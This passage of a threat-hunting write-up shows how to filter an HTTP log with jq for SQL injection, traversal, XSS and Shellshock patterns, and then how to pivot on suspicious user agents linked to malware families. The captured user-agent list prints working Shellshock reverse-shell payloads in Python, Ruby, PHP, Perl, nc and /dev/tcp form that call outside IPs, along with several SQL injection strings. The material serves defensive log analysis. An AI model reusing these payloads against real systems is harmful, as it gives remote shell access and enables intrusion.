+    A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.<sup id="fnref:2"><a class="footnote-ref" href="#fn:2">2</a></sup></p>
+<p>We will search for <code>/*</code>, <code>**</code>, <code>UNION</code> ,<code>'</code> in <code>uri</code>, <code>host</code>, <code>username</code>, <code>user_agent</code></p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;/*&quot;,&quot;**&quot;,&quot; UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .host | contains(&quot;/*&quot;,&quot;**&quot;,&quot; UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .username | contains(&quot;/*&quot;,&quot;**&quot;,&quot; UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .user_agent | contains(&quot;/*&quot;,&quot;**&quot;,&quot; UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+</li>
+<li>
+<p>Connections with <code>status_msg</code> is <code>400 Bad Request</code> :</p>
+<p>if we lookup unique the status message for the requests
+<div class="codehilite"><pre><span></span>cat http.log | jq  &#39;.[] | select( .status_msg !=&quot;-&quot;) |  .status_code, .status_msg &#39;  | sort | uniq
+</pre></div></p>
+<div class="codehilite"><pre><span></span>&quot;Bad Request&quot;
+&quot;Not Found&quot;
+&quot;Not Modified&quot;
+&quot;OK&quot;
+</pre></div>
+
+<p>We will see interesting <code>Bad Request</code> msg which means The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing)|<sup id="fnref:5"><a class="footnote-ref" href="#fn:5">5</a></sup>.</p>
+<p>Let's add the ips from the requests with <code>400 Bad Request</code>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select((.status_code == 400)) | .[&quot;id.orig_h&quot;]&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div></p>
+</li>
+</ol>
+<p>All Commands at once:</p>
+<div class="codehilite"><pre><span></span>cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;..&quot;,&quot;/etc&quot;,&quot;||&quot;,&quot;pass&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;&lt;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .host | contains(&quot;&lt;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .user_agent | contains(&quot;() { :; };&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .username | contains(&quot;/*&quot;,&quot;**&quot;,&quot;UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .uri | contains(&quot;/*&quot;,&quot;**&quot;,&quot;UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .host | contains(&quot;/*&quot;,&quot;**&quot;,&quot;UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select ( .user_agent | contains(&quot;/*&quot;,&quot;**&quot;,&quot; UNION&quot;,&quot;&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;&quot;) ) | .[&quot;id.orig_h&quot;] &#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+
+cat http.log <span class="p">|</span> jq <span class="s1">&#39;.[] |  select((.status_code == 400)) | .[&quot;id.orig_h&quot;]&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">&amp;</span>&gt;&gt; detected_ips.csv
+</pre></div>
+
+<p>To remove all ips duplicates and double quotes <code>"</code>:</p>
+<div class="codehilite"><pre><span></span>cat detected_ips.csv <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tr -d <span class="s1">&#39;&quot;&#39;</span> &gt; detected_ips_clean.csv
+</pre></div>
+
+<p>Also use <code>wc -l</code> command to count the ips.</p>
+<div class="codehilite"><pre><span></span>cat detected_ips_clean.csv <span class="p">|</span> wc -l
+</pre></div>
+
+<details class="note"><summary>Unique malicious ip list 81</summary><div class="codehilite"><pre><span></span>0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,150.45.133.97,150.50.77.238,155.129.97.35,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,186.28.46.179,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,211.229.3.254,220.132.33.81,223.149.180.133,225.191.220.138,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,233.74.78.199,238.143.78.114,249.34.9.16,25.80.197.172,250.51.219.47,253.182.102.55,254.140.181.172,27.88.56.114,28.169.41.122,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,42.103.246.250,42.191.112.181,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,52.39.201.107,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45
+</pre></div>
+
+</details>
+<p>We have <mark>81</mark> unique malicious ip in our blacklist , let's find a pivot point to find the rest.</p>
+<hr />
+<h3 id="pivoting-on-suspicious-useragents-of-detected-ips">Pivoting on suspicious UserAgents of detected ips<a class="headerlink" href="#pivoting-on-suspicious-useragents-of-detected-ips" title="Permanent link">&para;</a></h3>
+<p>Get all <code>UserAgents</code> for ips we have collected</p>
+<div class="codehilite"><pre><span></span>for ips in $(cat detected_ips_clean.csv ) do
+          cat http.log | jq --arg ip $ips &#39;.[] | select(
+          .[&quot;id.orig_h&quot;] ==$ip
+          ) | .user_agent &#39; | sort | uniq | tr -d &#39;&quot;&#39; &amp;&gt;&gt; suspicious_ua.txt
+</pre></div>
+
+<blockquote>
+<p><code>tr -d '"'</code> removes <code>"</code> from each ip.<br>
+<code>--arg</code> This option passes a value <code>$ips</code> to the jq program as a predefined variable <code>$ip</code>.</p>
+</blockquote>
+<details class="note"><summary>List of suspicious UserAgents based on ips collected</summary><div class="codehilite"><pre><span></span>1&#39; UNION/**/SELECT/**/1,2,434635502,4/*&amp;blog=1
+Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
+Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)
+Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
+1&#39; UNION SELECT &#39;1&#39;,&#39;2&#39;,&#39;automatedscanning&#39;,&#39;1233627891&#39;,&#39;5&#39;/*
+Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)
+1&#39; UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- &#39;
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
+Wget/1.9+cvs-stable (Red Hat modified)
+1&#39; UNION SELECT -1,&#39;autosc&#39;,&#39;test&#39;,&#39;O:8:\\\stdClass\\\:3:{s:3:\\\mod\\\;s:15:\\\resourcesmodule\\\;s:3:\\\src\\\;s:20:\\\@random41940ceb78dbb\\\;s:3:\\\int\\\;s:0:\\\\\\;}&#39;,7,0,0,0,0,0,0 /*
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731
+Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.4.15451
+1&#39; UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&amp;blogId=1
+CholTBAgent
+() { :; }; /usr/bin/python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\150.45.133.97\,54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\/bin/sh\,\-i\]);&#39;
+Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5
+Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9b2) Gecko/2007121016 Firefox/3.0b2
+Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36
+Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18
+1&#39; UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- &#39;
+Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)
+1&#39; UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --
+Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
+Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
+Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5
+Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
+Mozilla/5.0 WinInet
+Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
+Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5
+() { :; }; /bin/bash -c &#39;/bin/nc 55535 220.132.33.81 -e /bin/bash&#39;
+Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)
+() { :; }; /usr/bin/ruby -rsocket -e&#39;f=TCPSocket.open(\227.110.45.126\,43870).to_i;exec sprintf(\/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\,f,f,f)&#39;
+Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)
+() { :; }; /usr/bin/php -r &#39;$sock=fsockopen(\229.229.189.246\,62570);exec(\/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\);&#39;
+Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6pre) Gecko/2008121605 Firefox/3.0.6pre
+Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.
+Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
+Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30
+Opera/6.05 (Windows 2000; U)  [oc]
+Opera/8.81 (Windows-NT 6.1; U; en)
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22
+Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0
+Mozilla/5.0 (Windows NT 10.0;Win64;x64)
+() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/31.254.228.4/48051 0&gt;&amp;1
+Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)
+Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15
+Mozilla/5.0 (Windows NT 5.1 ; v.)
+Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)
+Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
+RookIE/1.0
+Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
+Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
+Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5
+HttpBrowser/1.0
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092318 Fedora/3.0.2-1.fc9 Firefox/3.0.2
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1
+Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1
+1&#39; UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- &#39;
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
+Opera/9.23 (Windows NT 5.0; U; en)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)
+Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)
+Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30
+1&#39; UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&amp;blogId=1
+() { :; }; /usr/bin/perl -e &#39;use Socket;$i=\83.0.8.119\;$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\tcp\));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&gt;&amp;S\);open(STDOUT,\&gt;&amp;S\);open(STDERR,\&gt;&amp;S\);exec(\/bin/sh -i\);};&#39;
+Mozilla/4.0 (compatible; Metasploit RSPEC)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)
+Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19
+</pre></div>
+
+</details>
+<p>We can select the known suspicious user-agents<sup id="fnref:4"><a class="footnote-ref" href="#fn:4">4</a></sup> from the output to pivot on:</p>
+<ol>
+<li>
+<p>Rookie</p>
+<p>An Info Stealer designed to extract user account information such as logins and passwords and send them to a remote server. The HTTP communication is done using an uncommon User Agent called <code>RookIE/1.0</code>.<sup id="fnref:6"><a class="footnote-ref" href="#fn:6">6</a></sup></p>
+<div class="codehilite"><pre><span></span>RookIE/1.0
+</pre></div>
+
+</li>
+<li>
+<p>HttpBrowser RAT</p>
+<p>Backdoor is malware that has been used by several threat groups with notable for HTTPS communications with the <code>HttpBrowser/1.0</code> User-Agent. <sup id="fnref:7"><a class="footnote-ref" href="#fn:7">7</a></sup></p>
+<div class="codehilite"><pre><span></span>HttpBrowser/1.0
+</pre></div>
+
+</li>
+<li>
+<p>Dyre / Upatre</p>
+<p>Dyreza is able to intercept SSL traffic in Internet Explorer, Firefox and Chrome by hooking the browser via several API functions.<sup id="fnref:8"><a class="footnote-ref" href="#fn:8">8</a></sup></p>
+<div class="codehilite"><pre><span></span>Wget/1.9+cvs-stable (Red Hat modified)
+</pre></div>
+
+</li>
+<li>
+<p>Metasploit framework which is a widely used penetration testing tool and used also for hacking.</p>
+<p>Metasploit User Agent Strings:
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; Metasploit RSPEC)
+Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
+</pre></div></p>
+<p>and we have others two with typing errors or space missing
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
+Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
+Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
+Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.
+Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
+Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
+</pre></div></p>
+</li>
+<li>
+<p>W32/Kazy A trojan is a type of malware that performs activities without the user’s knowledge.</p>
+<p>These activities commonly include establishing remote access connections, capturing keyboard input, collecting system information, downloading/uploading files, dropping other malware into the infected system, performing denial-of-service (DoS) attacks, and running/terminating processes. <sup id="fnref2:9"><a class="footnote-ref" href="#fn:9">9</a></sup></p>
+<div class="codehilite"><pre><span></span>Mozilla/5.0 (Windows NT 5.1 ; v.)
+</pre></div>
+
+</li>
+<li>
+<p>Fun Web Products - Adware applications<sup id="fnref2:10"><a class="footnote-ref" href="#fn:10">10</a></sup>
+    <div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+</pre></div></p>
+</li>
+<li>
+<p>Adware Toolbar from PeoplePc<sup id="fnref:10"><a class="footnote-ref" href="#fn:10">10</a></sup>
+    <div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)
+</pre></div></p>
+</li>
+<li>
+<p>Sality botnet</p>
+<div class="codehilite"><pre><span></span>Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)
+Opera/8.81 (Windows-NT 6.1; U; en)
+</pre></div>
+
+</li>
+<li>
+<p>Malware: Generic Trojan<sup id="fnref:9"><a class="footnote-ref" href="#fn:9">9</a></sup>
+    <div class="codehilite"><pre><span></span>Mozilla/5.0 WinInet
+</pre></div></p>
+</li>
+<li>
+<p>Malware User Agent <sup id="fnref:12"><a class="footnote-ref" href="#fn:12">12</a></sup></p>
+<div class="codehilite"><pre><span></span>CholTBAgent
+</pre></div>
+
+</li>
+<li>
+<p>AntiVirXP08, also known as Anti Vir XP 08, AntivirusXP2008 or Antivirus XP 2008, is a rogue anti-spyware program and clone of XP Antivirus.</p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)    
+</pre></div>
+
+</li>
+<li>
+<p>PlugX APT Malware</p>
+<p>PlugX is a RAT (Remote Access Trojan) malware family that is around since 2008 and is used as a backdoor to fully control the victim's machine. Once the machine is infected, a cybercriminal can remotely execute several kinds of commands on the affected system.<sup id="fnref:14"><a class="footnote-ref" href="#fn:14">14</a></sup></p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
+</pre></div>
+
+<p>and we have others with typing errors or space missing
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
+</pre></div></p>
+</li>
+<li>
+<p>Fareit Malware <sup id="fnref2:15"><a class="footnote-ref" href="#fn:15">15</a></sup></p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
+</pre></div>
+
+<p>and we have others with typing errors or space missing
+<div class="codehilite"><pre><span></span>Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
+</pre></div></p>
+</li>
+<li>
+<p>Zebrocy malware <sup id="fnref:15"><a class="footnote-ref" href="#fn:15">15</a></sup></p>
+<div class="codehilite"><pre><span></span>Mozilla/5.0 (Windows NT 10.0;Win64;x64)
+</pre></div>
+
+</li>
+<li>
+<p>Misconfigured UserAgents <sup id="fnref:11"><a class="footnote-ref" href="#fn:11">11</a></sup></p>
+<p>The correct user-agent should be structured like this</p>
+<div class="codehilite"><pre><span></span>Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions].
+</pre></div>
+
+<p>From above list we can detect a few misconfigured user-agents:</p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
+</pre></div>
+
+<blockquote>
+<p><code>MSIEE</code></p>
+</blockquote>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)
+</pre></div>
+
+<blockquote>
+<p><code>Windows NTS</code></p>
+</blockquote>
+<div class="codehilite"><pre><span></span>Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
+</pre></div>
+
+<blockquote>
+<p><code>W1ndow</code></p>
+</blockquote>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)
+</pre></div>
+
+<blockquote>
+<p><code>500.0</code></p>
+</blockquote>
+<div class="codehilite"><pre><span></span>Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1
+</pre></div>
+
+<blockquote>
+<p><code>666</code></p>
+</blockquote>
+<p>Also we have a few with space missing</p>
+<div class="codehilite"><pre><span></span>Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
+</pre></div>
+
+<blockquote>
+<p><code>NT6.0</code></p>
+</blockquote>
+</li>
+</ol>
+<hr />
+<p>Create a list with all user agents we will pivot on:</p>
+<div class="codehilite"><pre><span></span>RookIE/1.0
+HttpBrowser/1.0
+Wget/1.9+cvs-stable (Red Hat modified)
+Mozilla/4.0 (compatible; Metasploit RSPEC)
+Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
+Mozilla/5.0 (Windows NT 5.1 ; v.)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)
+Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)
+Opera/8.81 (Windows-NT 6.1; U; en)
+Mozilla/5.0 WinInet
+CholTBAgent
+Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.
+Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)
+Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
+Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
+Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)
+Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
+Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
+Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
+Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
+Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
+Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
+Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
+Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
+Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
+Mozilla/5.0 (Windows NT 10.0;Win64;x64)
+Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1
+</pre></div>
+
+<p>We can search now for the related ips and added to the ips file</p>
